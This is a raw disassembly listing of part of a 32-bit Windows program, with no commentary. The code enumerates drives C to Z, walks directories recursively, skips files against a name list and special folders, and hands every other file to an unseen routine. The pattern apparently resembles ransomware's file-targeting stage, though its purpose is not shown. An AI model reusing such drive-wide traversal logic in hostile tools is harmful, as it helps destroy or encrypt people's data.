  402b6f:	0f 84 64 02 00 00    	je     0x402dd9
  402b75:	8b 85 48 fb ff ff    	mov    -0x4b8(%ebp),%eax
  402b7b:	83 e0 10             	and    $0x10,%eax
  402b7e:	74 6e                	je     0x402bee
  402b80:	68 54 55 40 00       	push   $0x405554
  402b85:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  402b8b:	51                   	push   %ecx
  402b8c:	ff 15 4c 40 40 00    	call   *0x40404c
  402b92:	85 c0                	test   %eax,%eax
  402b94:	74 53                	je     0x402be9
  402b96:	68 58 55 40 00       	push   $0x405558
  402b9b:	8d 95 74 fb ff ff    	lea    -0x48c(%ebp),%edx
  402ba1:	52                   	push   %edx
  402ba2:	ff 15 4c 40 40 00    	call   *0x40404c
  402ba8:	85 c0                	test   %eax,%eax
  402baa:	74 3d                	je     0x402be9
  402bac:	68 08 02 00 00       	push   $0x208
  402bb1:	6a 00                	push   $0x0
  402bb3:	8d 85 40 f9 ff ff    	lea    -0x6c0(%ebp),%eax
  402bb9:	50                   	push   %eax
  402bba:	e8 f1 05 00 00       	call   0x4031b0
  402bbf:	83 c4 0c             	add    $0xc,%esp
  402bc2:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  402bc8:	51                   	push   %ecx
  402bc9:	8b 55 08             	mov    0x8(%ebp),%edx
  402bcc:	52                   	push   %edx
  402bcd:	8d 85 40 f9 ff ff    	lea    -0x6c0(%ebp),%eax
  402bd3:	50                   	push   %eax
  402bd4:	ff 15 40 41 40 00    	call   *0x404140
  402bda:	8d 8d 40 f9 ff ff    	lea    -0x6c0(%ebp),%ecx
  402be0:	51                   	push   %ecx
  402be1:	e8 8a fe ff ff       	call   0x402a70
  402be6:	83 c4 04             	add    $0x4,%esp
  402be9:	e9 c2 01 00 00       	jmp    0x402db0
  402bee:	c6 85 3f f9 ff ff 01 	movb   $0x1,-0x6c1(%ebp)
  402bf5:	68 08 02 00 00       	push   $0x208
  402bfa:	6a 00                	push   $0x0
  402bfc:	8d 95 30 f7 ff ff    	lea    -0x8d0(%ebp),%edx
  402c02:	52                   	push   %edx
  402c03:	e8 a8 05 00 00       	call   0x4031b0
  402c08:	83 c4 0c             	add    $0xc,%esp
  402c0b:	68 08 02 00 00       	push   $0x208
  402c10:	6a 00                	push   $0x0
  402c12:	8d 85 28 f5 ff ff    	lea    -0xad8(%ebp),%eax
  402c18:	50                   	push   %eax
  402c19:	e8 92 05 00 00       	call   0x4031b0
  402c1e:	83 c4 0c             	add    $0xc,%esp
  402c21:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  402c27:	51                   	push   %ecx
  402c28:	8b 55 08             	mov    0x8(%ebp),%edx
  402c2b:	52                   	push   %edx
  402c2c:	8d 85 30 f7 ff ff    	lea    -0x8d0(%ebp),%eax
  402c32:	50                   	push   %eax
  402c33:	ff 15 40 41 40 00    	call   *0x404140
  402c39:	8d 8d 30 f7 ff ff    	lea    -0x8d0(%ebp),%ecx
  402c3f:	51                   	push   %ecx
  402c40:	8d 95 28 f5 ff ff    	lea    -0xad8(%ebp),%edx
  402c46:	52                   	push   %edx
  402c47:	e8 5e 05 00 00       	call   0x4031aa
  402c4c:	83 c4 08             	add    $0x8,%esp
  402c4f:	8d 85 28 f5 ff ff    	lea    -0xad8(%ebp),%eax
  402c55:	50                   	push   %eax
  402c56:	ff 15 50 41 40 00    	call   *0x404150
  402c5c:	c7 85 24 f5 ff ff 00 	movl   $0x0,-0xadc(%ebp)
  402c63:	00 00 00 
  402c66:	eb 0f                	jmp    0x402c77
  402c68:	8b 8d 24 f5 ff ff    	mov    -0xadc(%ebp),%ecx
  402c6e:	83 c1 01             	add    $0x1,%ecx
  402c71:	89 8d 24 f5 ff ff    	mov    %ecx,-0xadc(%ebp)
  402c77:	83 bd 24 f5 ff ff 15 	cmpl   $0x15,-0xadc(%ebp)
  402c7e:	73 29                	jae    0x402ca9
  402c80:	8b 95 24 f5 ff ff    	mov    -0xadc(%ebp),%edx
  402c86:	8b 44 95 a8          	mov    -0x58(%ebp,%edx,4),%eax
  402c8a:	50                   	push   %eax
  402c8b:	8d 8d 28 f5 ff ff    	lea    -0xad8(%ebp),%ecx
  402c91:	51                   	push   %ecx
  402c92:	e8 49 01 00 00       	call   0x402de0
  402c97:	83 c4 08             	add    $0x8,%esp
  402c9a:	85 c0                	test   %eax,%eax
  402c9c:	74 09                	je     0x402ca7
  402c9e:	c6 85 3f f9 ff ff 00 	movb   $0x0,-0x6c1(%ebp)
  402ca5:	eb 02                	jmp    0x402ca9
  402ca7:	eb bf                	jmp    0x402c68
  402ca9:	0f b6 95 3f f9 ff ff 	movzbl -0x6c1(%ebp),%edx
  402cb0:	85 d2                	test   %edx,%edx
  402cb2:	0f 84 f8 00 00 00    	je     0x402db0
  402cb8:	68 60 55 40 00       	push   $0x405560
  402cbd:	8d 85 74 fb ff ff    	lea    -0x48c(%ebp),%eax
  402cc3:	50                   	push   %eax
  402cc4:	ff 15 44 41 40 00    	call   *0x404144
  402cca:	85 c0                	test   %eax,%eax
  402ccc:	0f 84 de 00 00 00    	je     0x402db0
  402cd2:	8b 8d 48 fb ff ff    	mov    -0x4b8(%ebp),%ecx
  402cd8:	51                   	push   %ecx
  402cd9:	8d 95 30 f7 ff ff    	lea    -0x8d0(%ebp),%edx
  402cdf:	52                   	push   %edx
  402ce0:	e8 1b 01 00 00       	call   0x402e00
  402ce5:	83 c4 08             	add    $0x8,%esp
  402ce8:	0f b6 c0             	movzbl %al,%eax
  402ceb:	85 c0                	test   %eax,%eax
  402ced:	74 07                	je     0x402cf6
  402cef:	c6 85 3f f9 ff ff 00 	movb   $0x0,-0x6c1(%ebp)
  402cf6:	68 6c 55 40 00       	push   $0x40556c
  402cfb:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  402d01:	51                   	push   %ecx
  402d02:	e8 d9 00 00 00       	call   0x402de0
  402d07:	83 c4 08             	add    $0x8,%esp
  402d0a:	85 c0                	test   %eax,%eax
  402d0c:	0f 85 9e 00 00 00    	jne    0x402db0
  402d12:	68 74 55 40 00       	push   $0x405574
  402d17:	8d 95 74 fb ff ff    	lea    -0x48c(%ebp),%edx
  402d1d:	52                   	push   %edx
  402d1e:	e8 bd 00 00 00       	call   0x402de0
  402d23:	83 c4 08             	add    $0x8,%esp
  402d26:	85 c0                	test   %eax,%eax
  402d28:	0f 85 82 00 00 00    	jne    0x402db0
  402d2e:	68 7c 55 40 00       	push   $0x40557c
  402d33:	8d 85 74 fb ff ff    	lea    -0x48c(%ebp),%eax
  402d39:	50                   	push   %eax
  402d3a:	e8 a1 00 00 00       	call   0x402de0
  402d3f:	83 c4 08             	add    $0x8,%esp
  402d42:	85 c0                	test   %eax,%eax
  402d44:	75 6a                	jne    0x402db0
  402d46:	68 84 55 40 00       	push   $0x405584
  402d4b:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  402d51:	51                   	push   %ecx
  402d52:	e8 89 00 00 00       	call   0x402de0
  402d57:	83 c4 08             	add    $0x8,%esp
  402d5a:	85 c0                	test   %eax,%eax
  402d5c:	75 52                	jne    0x402db0
  402d5e:	68 94 55 40 00       	push   $0x405594
  402d63:	8d 95 74 fb ff ff    	lea    -0x48c(%ebp),%edx
  402d69:	52                   	push   %edx
  402d6a:	e8 71 00 00 00       	call   0x402de0
  402d6f:	83 c4 08             	add    $0x8,%esp
  402d72:	85 c0                	test   %eax,%eax
  402d74:	75 3a                	jne    0x402db0
  402d76:	68 ac 55 40 00       	push   $0x4055ac
  402d7b:	8d 85 74 fb ff ff    	lea    -0x48c(%ebp),%eax
  402d81:	50                   	push   %eax
  402d82:	e8 59 00 00 00       	call   0x402de0
  402d87:	83 c4 08             	add    $0x8,%esp
  402d8a:	85 c0                	test   %eax,%eax
  402d8c:	75 22                	jne    0x402db0
  402d8e:	0f b6 8d 3f f9 ff ff 	movzbl -0x6c1(%ebp),%ecx
  402d95:	85 c9                	test   %ecx,%ecx
  402d97:	74 17                	je     0x402db0
  402d99:	6a 32                	push   $0x32
  402d9b:	ff 15 88 40 40 00    	call   *0x404088
  402da1:	8d 95 30 f7 ff ff    	lea    -0x8d0(%ebp),%edx
  402da7:	52                   	push   %edx
  402da8:	e8 83 f7 ff ff       	call   0x402530
  402dad:	83 c4 04             	add    $0x4,%esp
  402db0:	8d 85 48 fb ff ff    	lea    -0x4b8(%ebp),%eax
  402db6:	50                   	push   %eax
  402db7:	8b 8d 9c fd ff ff    	mov    -0x264(%ebp),%ecx
  402dbd:	51                   	push   %ecx
  402dbe:	ff 15 50 40 40 00    	call   *0x404050
  402dc4:	85 c0                	test   %eax,%eax
  402dc6:	0f 85 a9 fd ff ff    	jne    0x402b75
  402dcc:	8b 95 9c fd ff ff    	mov    -0x264(%ebp),%edx
  402dd2:	52                   	push   %edx
  402dd3:	ff 15 70 40 40 00    	call   *0x404070
  402dd9:	8b e5                	mov    %ebp,%esp
  402ddb:	5d                   	pop    %ebp
  402ddc:	c3                   	ret
  402ddd:	cc                   	int3
  402dde:	cc                   	int3
  402ddf:	cc                   	int3
  402de0:	55                   	push   %ebp
  402de1:	8b ec                	mov    %esp,%ebp
  402de3:	8b 45 0c             	mov    0xc(%ebp),%eax
  402de6:	50                   	push   %eax
  402de7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402dea:	51                   	push   %ecx
  402deb:	e8 c6 03 00 00       	call   0x4031b6
  402df0:	83 c4 08             	add    $0x8,%esp
  402df3:	5d                   	pop    %ebp
  402df4:	c3                   	ret
  402df5:	cc                   	int3
  402df6:	cc                   	int3
  402df7:	cc                   	int3
  402df8:	cc                   	int3
  402df9:	cc                   	int3
  402dfa:	cc                   	int3
  402dfb:	cc                   	int3
  402dfc:	cc                   	int3
  402dfd:	cc                   	int3
  402dfe:	cc                   	int3
  402dff:	cc                   	int3
  402e00:	55                   	push   %ebp
  402e01:	8b ec                	mov    %esp,%ebp
  402e03:	81 ec 10 02 00 00    	sub    $0x210,%esp
  402e09:	83 7d 0c ff          	cmpl   $0xffffffff,0xc(%ebp)
  402e0d:	74 0f                	je     0x402e1e
  402e0f:	8b 45 0c             	mov    0xc(%ebp),%eax
  402e12:	83 e0 04             	and    $0x4,%eax
  402e15:	74 07                	je     0x402e1e
  402e17:	b0 01                	mov    $0x1,%al
  402e19:	e9 ef 00 00 00       	jmp    0x402f0d
  402e1e:	83 3d 38 68 40 00 00 	cmpl   $0x0,0x406838
  402e25:	75 05                	jne    0x402e2c
  402e27:	e8 f4 00 00 00       	call   0x402f20
  402e2c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402e2f:	51                   	push   %ecx
  402e30:	e8 93 03 00 00       	call   0x4031c8
  402e35:	83 c4 04             	add    $0x4,%esp
  402e38:	3d 04 01 00 00       	cmp    $0x104,%eax
  402e3d:	72 07                	jb     0x402e46
  402e3f:	32 c0                	xor    %al,%al
  402e41:	e9 c7 00 00 00       	jmp    0x402f0d
  402e46:	8b 55 08             	mov    0x8(%ebp),%edx
  402e49:	52                   	push   %edx
  402e4a:	68 04 01 00 00       	push   $0x104
  402e4f:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
  402e55:	50                   	push   %eax
  402e56:	e8 67 03 00 00       	call   0x4031c2
  402e5b:	83 c4 0c             	add    $0xc,%esp
  402e5e:	8d 8d f8 fd ff ff    	lea    -0x208(%ebp),%ecx
  402e64:	51                   	push   %ecx
  402e65:	ff 15 50 41 40 00    	call   *0x404150
  402e6b:	c7 85 f4 fd ff ff 00 	movl   $0x0,-0x20c(%ebp)
  402e72:	00 00 00 
  402e75:	eb 0f                	jmp    0x402e86
  402e77:	8b 95 f4 fd ff ff    	mov    -0x20c(%ebp),%edx
  402e7d:	83 c2 01             	add    $0x1,%edx
  402e80:	89 95 f4 fd ff ff    	mov    %edx,-0x20c(%ebp)
  402e86:	8b 85 f4 fd ff ff    	mov    -0x20c(%ebp),%eax
  402e8c:	3b 05 38 68 40 00    	cmp    0x406838,%eax
  402e92:	7d 77                	jge    0x402f0b
  402e94:	8b 8d f4 fd ff ff    	mov    -0x20c(%ebp),%ecx
  402e9a:	69 c9 08 02 00 00    	imul   $0x208,%ecx,%ecx
  402ea0:	81 c1 18 60 40 00    	add    $0x406018,%ecx
  402ea6:	51                   	push   %ecx
  402ea7:	e8 1c 03 00 00       	call   0x4031c8
  402eac:	83 c4 04             	add    $0x4,%esp
  402eaf:	89 85 f0 fd ff ff    	mov    %eax,-0x210(%ebp)
  402eb5:	83 bd f0 fd ff ff 00 	cmpl   $0x0,-0x210(%ebp)
  402ebc:	76 48                	jbe    0x402f06
  402ebe:	8d 95 f8 fd ff ff    	lea    -0x208(%ebp),%edx
  402ec4:	52                   	push   %edx
  402ec5:	e8 fe 02 00 00       	call   0x4031c8
  402eca:	83 c4 04             	add    $0x4,%esp
  402ecd:	39 85 f0 fd ff ff    	cmp    %eax,-0x210(%ebp)
  402ed3:	77 31                	ja     0x402f06
  402ed5:	8b 85 f0 fd ff ff    	mov    -0x210(%ebp),%eax
  402edb:	50                   	push   %eax
  402edc:	8b 8d f4 fd ff ff    	mov    -0x20c(%ebp),%ecx
  402ee2:	69 c9 08 02 00 00    	imul   $0x208,%ecx,%ecx
  402ee8:	81 c1 18 60 40 00    	add    $0x406018,%ecx
  402eee:	51                   	push   %ecx
  402eef:	8d 95 f8 fd ff ff    	lea    -0x208(%ebp),%edx
  402ef5:	52                   	push   %edx
  402ef6:	e8 c1 02 00 00       	call   0x4031bc
  402efb:	83 c4 0c             	add    $0xc,%esp
  402efe:	85 c0                	test   %eax,%eax
  402f00:	75 04                	jne    0x402f06
  402f02:	b0 01                	mov    $0x1,%al
  402f04:	eb 07                	jmp    0x402f0d
  402f06:	e9 6c ff ff ff       	jmp    0x402e77
  402f0b:	32 c0                	xor    %al,%al
  402f0d:	8b e5                	mov    %ebp,%esp
  402f0f:	5d                   	pop    %ebp
  402f10:	c3                   	ret
  402f11:	cc                   	int3
  402f12:	cc                   	int3
  402f13:	cc                   	int3
  402f14:	cc                   	int3
  402f15:	cc                   	int3
  402f16:	cc                   	int3
  402f17:	cc                   	int3
  402f18:	cc                   	int3
  402f19:	cc                   	int3
  402f1a:	cc                   	int3
  402f1b:	cc                   	int3
  402f1c:	cc                   	int3
  402f1d:	cc                   	int3
  402f1e:	cc                   	int3
  402f1f:	cc                   	int3
  402f20:	55                   	push   %ebp
  402f21:	8b ec                	mov    %esp,%ebp
  402f23:	81 ec 24 02 00 00    	sub    $0x224,%esp
  402f29:	83 3d 38 68 40 00 00 	cmpl   $0x0,0x406838
  402f30:	7e 05                	jle    0x402f37
  402f32:	e9 58 01 00 00       	jmp    0x40308f
  402f37:	c7 45 f0 94 52 40 00 	movl   $0x405294,-0x10(%ebp)
  402f3e:	c7 45 f4 a8 52 40 00 	movl   $0x4052a8,-0xc(%ebp)
  402f45:	c7 45 f8 c8 52 40 00 	movl   $0x4052c8,-0x8(%ebp)
  402f4c:	c7 45 fc f0 52 40 00 	movl   $0x4052f0,-0x4(%ebp)
  402f53:	c7 85 e4 fd ff ff 00 	movl   $0x0,-0x21c(%ebp)
  402f5a:	00 00 00 
  402f5d:	eb 0f                	jmp    0x402f6e
  402f5f:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  402f65:	83 c0 01             	add    $0x1,%eax
  402f68:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  402f6e:	83 bd e4 fd ff ff 04 	cmpl   $0x4,-0x21c(%ebp)
  402f75:	0f 8d 14 01 00 00    	jge    0x40308f
  402f7b:	83 bd e4 fd ff ff 04 	cmpl   $0x4,-0x21c(%ebp)
  402f82:	0f 8d 07 01 00 00    	jge    0x40308f
  402f88:	68 04 01 00 00       	push   $0x104
  402f8d:	8d 8d e8 fd ff ff    	lea    -0x218(%ebp),%ecx
  402f93:	51                   	push   %ecx
  402f94:	8b 95 e4 fd ff ff    	mov    -0x21c(%ebp),%edx
  402f9a:	8b 44 95 f0          	mov    -0x10(%ebp,%edx,4),%eax
  402f9e:	50                   	push   %eax
  402f9f:	ff 15 9c 40 40 00    	call   *0x40409c
  402fa5:	85 c0                	test   %eax,%eax
  402fa7:	75 02                	jne    0x402fab
  402fa9:	eb b4                	jmp    0x402f5f
  402fab:	8d 8d e8 fd ff ff    	lea    -0x218(%ebp),%ecx
  402fb1:	51                   	push   %ecx
  402fb2:	e8 11 02 00 00       	call   0x4031c8
  402fb7:	83 c4 04             	add    $0x4,%esp
  402fba:	3d 03 01 00 00       	cmp    $0x103,%eax
  402fbf:	72 02                	jb     0x402fc3
  402fc1:	eb 9c                	jmp    0x402f5f
  402fc3:	8d 95 e8 fd ff ff    	lea    -0x218(%ebp),%edx
  402fc9:	52                   	push   %edx
  402fca:	68 04 01 00 00       	push   $0x104
  402fcf:	a1 38 68 40 00       	mov    0x406838,%eax
  402fd4:	69 c0 08 02 00 00    	imul   $0x208,%eax,%eax
  402fda:	05 18 60 40 00       	add    $0x406018,%eax
  402fdf:	50                   	push   %eax
  402fe0:	e8 dd 01 00 00       	call   0x4031c2
  402fe5:	83 c4 0c             	add    $0xc,%esp
  402fe8:	8b 0d 38 68 40 00    	mov    0x406838,%ecx
  402fee:	69 c9 08 02 00 00    	imul   $0x208,%ecx,%ecx
  402ff4:	81 c1 18 60 40 00    	add    $0x406018,%ecx
  402ffa:	51                   	push   %ecx
  402ffb:	e8 a0 00 00 00       	call   0x4030a0
  403000:	83 c4 04             	add    $0x4,%esp
  403003:	c6 85 e3 fd ff ff 00 	movb   $0x0,-0x21d(%ebp)
  40300a:	c7 85 dc fd ff ff 00 	movl   $0x0,-0x224(%ebp)
  403011:	00 00 00 
  403014:	eb 0f                	jmp    0x403025
  403016:	8b 95 dc fd ff ff    	mov    -0x224(%ebp),%edx
  40301c:	83 c2 01             	add    $0x1,%edx
  40301f:	89 95 dc fd ff ff    	mov    %edx,-0x224(%ebp)
  403025:	8b 85 dc fd ff ff    	mov    -0x224(%ebp),%eax
  40302b:	3b 05 38 68 40 00    	cmp    0x406838,%eax
  403031:	7d 3d                	jge    0x403070
  403033:	8b 8d dc fd ff ff    	mov    -0x224(%ebp),%ecx
  403039:	69 c9 08 02 00 00    	imul   $0x208,%ecx,%ecx
  40303f:	81 c1 18 60 40 00    	add    $0x406018,%ecx
  403045:	51                   	push   %ecx
  403046:	8b 15 38 68 40 00    	mov    0x406838,%edx
  40304c:	69 d2 08 02 00 00    	imul   $0x208,%edx,%edx
  403052:	81 c2 18 60 40 00    	add    $0x406018,%edx
  403058:	52                   	push   %edx
  403059:	e8 70 01 00 00       	call   0x4031ce
  40305e:	83 c4 08             	add    $0x8,%esp
  403061:	85 c0                	test   %eax,%eax
  403063:	75 09                	jne    0x40306e
  403065:	c6 85 e3 fd ff ff 01 	movb   $0x1,-0x21d(%ebp)
  40306c:	eb 02                	jmp    0x403070
  40306e:	eb a6                	jmp    0x403016
  403070:	0f b6 85 e3 fd ff ff 	movzbl -0x21d(%ebp),%eax
  403077:	85 c0                	test   %eax,%eax
  403079:	75 0f                	jne    0x40308a
  40307b:	8b 0d 38 68 40 00    	mov    0x406838,%ecx
  403081:	83 c1 01             	add    $0x1,%ecx
  403084:	89 0d 38 68 40 00    	mov    %ecx,0x406838
  40308a:	e9 d0 fe ff ff       	jmp    0x402f5f
  40308f:	8b e5                	mov    %ebp,%esp
  403091:	5d                   	pop    %ebp
  403092:	c3                   	ret
  403093:	cc                   	int3
  403094:	cc                   	int3
  403095:	cc                   	int3
  403096:	cc                   	int3
  403097:	cc                   	int3
  403098:	cc                   	int3
  403099:	cc                   	int3
  40309a:	cc                   	int3
  40309b:	cc                   	int3
  40309c:	cc                   	int3
  40309d:	cc                   	int3
  40309e:	cc                   	int3
  40309f:	cc                   	int3
  4030a0:	55                   	push   %ebp
  4030a1:	8b ec                	mov    %esp,%ebp
  4030a3:	83 ec 08             	sub    $0x8,%esp
  4030a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4030a9:	50                   	push   %eax
  4030aa:	ff 15 50 41 40 00    	call   *0x404150
  4030b0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4030b3:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4030b6:	eb 09                	jmp    0x4030c1
  4030b8:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4030bb:	83 c2 02             	add    $0x2,%edx
  4030be:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4030c1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4030c4:	0f b7 08             	movzwl (%eax),%ecx
  4030c7:	85 c9                	test   %ecx,%ecx
  4030c9:	74 18                	je     0x4030e3
  4030cb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4030ce:	0f b7 02             	movzwl (%edx),%eax
  4030d1:	83 f8 2f             	cmp    $0x2f,%eax
  4030d4:	75 0b                	jne    0x4030e1
  4030d6:	b9 5c 00 00 00       	mov    $0x5c,%ecx
  4030db:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4030de:	66 89 0a             	mov    %cx,(%edx)
  4030e1:	eb d5                	jmp    0x4030b8
  4030e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4030e6:	50                   	push   %eax
  4030e7:	e8 dc 00 00 00       	call   0x4031c8
  4030ec:	83 c4 04             	add    $0x4,%esp
  4030ef:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4030f2:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4030f6:	76 2f                	jbe    0x403127
  4030f8:	81 7d fc 03 01 00 00 	cmpl   $0x103,-0x4(%ebp)
  4030ff:	73 26                	jae    0x403127
  403101:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403104:	8b 55 08             	mov    0x8(%ebp),%edx
  403107:	0f b7 44 4a fe       	movzwl -0x2(%edx,%ecx,2),%eax
  40310c:	83 f8 5c             	cmp    $0x5c,%eax
  40310f:	74 16                	je     0x403127
  403111:	68 90 52 40 00       	push   $0x405290
  403116:	68 04 01 00 00       	push   $0x104
  40311b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40311e:	51                   	push   %ecx
  40311f:	e8 b0 00 00 00       	call   0x4031d4
  403124:	83 c4 0c             	add    $0xc,%esp
  403127:	8b e5                	mov    %ebp,%esp
  403129:	5d                   	pop    %ebp
  40312a:	c3                   	ret
  40312b:	cc                   	int3
  40312c:	cc                   	int3
  40312d:	cc                   	int3
  40312e:	cc                   	int3
  40312f:	cc                   	int3
  403130:	55                   	push   %ebp
  403131:	8b ec                	mov    %esp,%ebp
  403133:	83 ec 24             	sub    $0x24,%esp
  403136:	e8 75 f8 ff ff       	call   0x4029b0
  40313b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40313e:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  403145:	eb 09                	jmp    0x403150
  403147:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40314a:	83 c0 01             	add    $0x1,%eax
  40314d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403150:	83 7d f8 19          	cmpl   $0x19,-0x8(%ebp)
  403154:	7f 39                	jg     0x40318f
  403156:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  403159:	51                   	push   %ecx
  40315a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40315d:	52                   	push   %edx
  40315e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403161:	50                   	push   %eax
  403162:	e8 69 f7 ff ff       	call   0x4028d0
  403167:	83 c4 0c             	add    $0xc,%esp
  40316a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40316d:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403170:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  403173:	83 7d dc 02          	cmpl   $0x2,-0x24(%ebp)
  403177:	72 14                	jb     0x40318d
  403179:	83 7d dc 04          	cmpl   $0x4,-0x24(%ebp)
  40317d:	76 02                	jbe    0x403181
  40317f:	eb 0c                	jmp    0x40318d
  403181:	8d 55 e0             	lea    -0x20(%ebp),%edx
  403184:	52                   	push   %edx
  403185:	e8 e6 f8 ff ff       	call   0x402a70
  40318a:	83 c4 04             	add    $0x4,%esp
  40318d:	eb b8                	jmp    0x403147
  40318f:	6a 00                	push   $0x0
  403191:	ff 15 44 40 40 00    	call   *0x404044
  403197:	8b e5                	mov    %ebp,%esp
  403199:	5d                   	pop    %ebp
  40319a:	c2 04 00             	ret    $0x4
  40319d:	cc                   	int3
  40319e:	ff 25 38 41 40 00    	jmp    *0x404138
  4031a4:	ff 25 34 41 40 00    	jmp    *0x404134
  4031aa:	ff 25 30 41 40 00    	jmp    *0x404130
  4031b0:	ff 25 2c 41 40 00    	jmp    *0x40412c
  4031b6:	ff 25 28 41 40 00    	jmp    *0x404128
  4031bc:	ff 25 24 41 40 00    	jmp    *0x404124
  4031c2:	ff 25 20 41 40 00    	jmp    *0x404120
  4031c8:	ff 25 1c 41 40 00    	jmp    *0x40411c
  4031ce:	ff 25 18 41 40 00    	jmp    *0x404118
  4031d4:	ff 25 14 41 40 00    	jmp    *0x404114
  4031da:	68 28 36 40 00       	push   $0x403628
  4031df:	e8 07 04 00 00       	call   0x4035eb
  4031e4:	a1 64 68 40 00       	mov    0x406864,%eax
  4031e9:	c7 04 24 50 68 40 00 	movl   $0x406850,(%esp)
  4031f0:	ff 35 60 68 40 00    	push   0x406860
  4031f6:	a3 50 68 40 00       	mov    %eax,0x406850
  4031fb:	68 40 68 40 00       	push   $0x406840
  403200:	68 44 68 40 00       	push   $0x406844
  403205:	68 3c 68 40 00       	push   $0x40683c
  40320a:	ff 15 0c 41 40 00    	call   *0x40410c
  403210:	83 c4 14             	add    $0x14,%esp
  403213:	a3 4c 68 40 00       	mov    %eax,0x40684c
  403218:	85 c0                	test   %eax,%eax
  40321a:	7d 08                	jge    0x403224
  40321c:	6a 08                	push   $0x8
  40321e:	e8 1d 03 00 00       	call   0x403540
  403223:	59                   	pop    %ecx
  403224:	c3                   	ret
  403225:	6a 58                	push   $0x58
  403227:	68 28 56 40 00       	push   $0x405628
  40322c:	e8 8b 05 00 00       	call   0x4037bc
  403231:	33 db                	xor    %ebx,%ebx
  403233:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403236:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403239:	8d 45 98             	lea    -0x68(%ebp),%eax
  40323c:	50                   	push   %eax
  40323d:	ff 15 38 40 40 00    	call   *0x404038
  403243:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40324a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  403251:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  403257:	8b 70 04             	mov    0x4(%eax),%esi
  40325a:	bf 9c 6b 40 00       	mov    $0x406b9c,%edi
  40325f:	6a 00                	push   $0x0
  403261:	56                   	push   %esi
  403262:	57                   	push   %edi
  403263:	ff 15 3c 40 40 00    	call   *0x40403c
  403269:	85 c0                	test   %eax,%eax
  40326b:	74 18                	je     0x403285
  40326d:	3b c6                	cmp    %esi,%eax
  40326f:	75 07                	jne    0x403278
  403271:	33 f6                	xor    %esi,%esi
  403273:	46                   	inc    %esi
  403274:	8b de                	mov    %esi,%ebx
  403276:	eb 10                	jmp    0x403288
  403278:	68 e8 03 00 00       	push   $0x3e8
  40327d:	ff 15 88 40 40 00    	call   *0x404088
  403283:	eb da                	jmp    0x40325f
  403285:	33 f6                	xor    %esi,%esi
  403287:	46                   	inc    %esi
  403288:	a1 98 6b 40 00       	mov    0x406b98,%eax
  40328d:	3b c6                	cmp    %esi,%eax
  40328f:	75 0a                	jne    0x40329b
  403291:	6a 1f                	push   $0x1f
  403293:	e8 a8 02 00 00       	call   0x403540
  403298:	59                   	pop    %ecx
  403299:	eb 2f                	jmp    0x4032ca
  40329b:	a1 98 6b 40 00       	mov    0x406b98,%eax
  4032a0:	85 c0                	test   %eax,%eax
  4032a2:	75 20                	jne    0x4032c4
  4032a4:	89 35 98 6b 40 00    	mov    %esi,0x406b98
  4032aa:	68 70 41 40 00       	push   $0x404170
  4032af:	68 64 41 40 00       	push   $0x404164
  4032b4:	e8 fb 04 00 00       	call   0x4037b4
  4032b9:	59                   	pop    %ecx
  4032ba:	59                   	pop    %ecx
  4032bb:	85 c0                	test   %eax,%eax
  4032bd:	74 0b                	je     0x4032ca
  4032bf:	e9 2e 01 00 00       	jmp    0x4033f2
  4032c4:	89 35 58 68 40 00    	mov    %esi,0x406858
  4032ca:	a1 98 6b 40 00       	mov    0x406b98,%eax
  4032cf:	3b c6                	cmp    %esi,%eax
  4032d1:	75 1b                	jne    0x4032ee
  4032d3:	68 60 41 40 00       	push   $0x404160
  4032d8:	68 58 41 40 00       	push   $0x404158
  4032dd:	e8 cc 04 00 00       	call   0x4037ae
  4032e2:	59                   	pop    %ecx
  4032e3:	59                   	pop    %ecx
  4032e4:	c7 05 98 6b 40 00 02 	movl   $0x2,0x406b98
  4032eb:	00 00 00 
  4032ee:	85 db                	test   %ebx,%ebx
  4032f0:	75 08                	jne    0x4032fa
  4032f2:	53                   	push   %ebx
  4032f3:	57                   	push   %edi
  4032f4:	ff 15 40 40 40 00    	call   *0x404040
  4032fa:	83 3d a8 6b 40 00 00 	cmpl   $0x0,0x406ba8
  403301:	74 1b                	je     0x40331e
  403303:	68 a8 6b 40 00       	push   $0x406ba8
  403308:	e8 e3 03 00 00       	call   0x4036f0
  40330d:	59                   	pop    %ecx
  40330e:	85 c0                	test   %eax,%eax
  403310:	74 0c                	je     0x40331e
  403312:	6a 00                	push   $0x0
  403314:	6a 02                	push   $0x2
  403316:	6a 00                	push   $0x0
